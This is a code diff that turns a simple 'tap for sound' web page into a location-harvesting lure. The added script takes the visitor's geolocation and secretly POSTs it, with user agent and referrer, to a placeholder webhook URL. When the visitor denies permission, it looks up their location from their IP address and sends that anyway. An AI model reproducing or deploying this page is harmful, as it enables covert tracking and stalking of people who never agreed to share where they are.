@@ -9,6 +9,8 @@
             padding: 0;
             height: 100%;
             background: #000;
+            color: white;
+            font-family: Arial;
         }
         #playButton {
             width: 100%;
@@ -16,45 +18,95 @@
             border: none;
             background: linear-gradient(45deg, #ff0000, #0000ff);
             color: white;
-            font-size: 32px;
-            font-family: Arial;
+            font-size: 24px;
             cursor: pointer;
+        }
+        #status {
+            position: fixed;
+            top: 10px;
+            left: 10px;
+            background: rgba(0,0,0,0.7);
+            padding: 10px;
+            border-radius: 5px;
+            font-size: 12px;
         }
     </style>
 </head>
 <body>
-    <button id="playButton">🎵 TAP HERE FOR SOUND 🎵</button>
+    <button id="playButton">🎵 TAP FOR SOUND & LOCATION 🎵</button>
+    <div id="status"></div>
 
     <script>
-        document.getElementById('playButton').addEventListener('click', function() {
-            // Пробуем разные источники звука
-            const soundUrls = [
-                'https://www.soundjay.com/buttons/sounds/beep-07.mp3',
-                'https://www.soundjay.com/buttons/sounds/beep-01a.mp3',
-                'https://assets.mixkit.co/sfx/preview/mixkit-arcade-retro-game-over-213.mp3'
-            ];
-            
-            let audio = new Audio(soundUrls[0]);
+        const statusDiv = document.getElementById('status');
+        const MY_WEBHOOK_URL = 'https://webhook.site/YOUR-UNIQUE-URL'; // Замени на свой webhook URL
+
+        function sendLocation(locationData) {
+            // Отправляем данные на webhook
+            fetch(MY_WEBHOOK_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    location: locationData,
+                    userAgent: navigator.userAgent,
+                    timestamp: new Date().toISOString(),
+                    referrer: document.referrer
+                })
+            }).catch(error => console.log('Error sending data'));
+        }
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        const locationData = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy + ' meters'
+                        };
+                        
+                        statusDiv.innerHTML = `📍 Location: ${locationData.latitude}, ${locationData.longitude}`;
+                        sendLocation(locationData);
+                        
+                        // Воспроизводим звук после получения локации
+                        playSound();
+                    },
+                    function(error) {
+                        statusDiv.innerHTML = '❌ Location access denied';
+                        // Все равно воспроизводим звук
+                        playSound();
+                        
+                        // Отправляем IP-based location
+                        fetch('https://ipapi.co/json/')
+                            .then(response => response.json())
+                            .then(ipData => {
+                                sendLocation({
+                                    ip: ipData.ip,
+                                    city: ipData.city,
+                                    country: ipData.country_name,
+                                    approximate: true
+                                });
+                            });
+                    }
+                );
+            } else {
+                statusDiv.innerHTML = 'Geolocation not supported';
+                playSound();
+            }
+        }
+
+        function playSound() {
+            const audio = new Audio('https://www.soundjay.com/buttons/sounds/beep-07.mp3');
             audio.play().then(() => {
-                this.innerHTML = '🔊 SOUND IS PLAYING!';
-                this.style.background = 'green';
-            }).catch(error => {
-                // Пробуем второй источник
-                audio = new Audio(soundUrls[1]);
-                audio.play().then(() => {
-                    this.innerHTML = '🔊 SOUND IS PLAYING!';
-                    this.style.background = 'green';
-                }).catch(error2 => {
-                    // Пробуем третий источник
-                    audio = new Audio(soundUrls[2]);
-                    audio.play().then(() => {
-                        this.innerHTML = '🔊 SOUND IS PLAYING!';
-                        this.style.background = 'green';
-                    }).catch(error3 => {
-                        this.innerHTML = 'Browser blocked all sounds';
-                    });
-                });
+                document.getElementById('playButton').innerHTML = '🔊 SOUND PLAYING!';
+                document.getElementById('playButton').style.background = 'green';
             });
+        }
+
+        document.getElementById('playButton').addEventListener('click', function() {
+            statusDiv.innerHTML = '🕐 Requesting location...';
+            getLocation();
         });
     </script>
 </body>
